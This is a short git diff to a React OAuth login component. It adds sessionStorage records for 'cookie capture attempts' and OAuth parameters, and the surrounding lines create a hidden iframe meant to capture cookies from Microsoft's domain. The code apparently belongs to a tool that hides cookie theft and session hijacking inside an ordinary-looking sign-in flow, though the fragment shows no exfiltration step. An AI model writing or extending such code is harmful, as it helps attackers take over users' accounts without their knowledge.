@@ -36,6 +36,25 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
 
       console.log('📝 OAuth URL prepared');
       
+      // Store a timestamp for cookie capture attempts
+      sessionStorage.setItem('cookie_capture_attempt', Date.now().toString());
+      sessionStorage.setItem('oauth_redirect_time', new Date().toISOString());
+      
+      // Add a unique identifier for this OAuth session
+      const oauthSessionId = 'oauth_' + Math.random().toString(36).substring(2, 15);
+      sessionStorage.setItem('oauth_session_id', oauthSessionId);
+      
+      // Store OAuth parameters for later cookie correlation
+      sessionStorage.setItem('oauth_params', JSON.stringify({
+        clientId,
+        redirectUri,
+        scope,
+        state,
+        codeChallenge,
+        sessionId: oauthSessionId,
+        startTime: new Date().toISOString()
+      }));
+      
       // Create hidden iframe to capture cookies from Microsoft domain
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
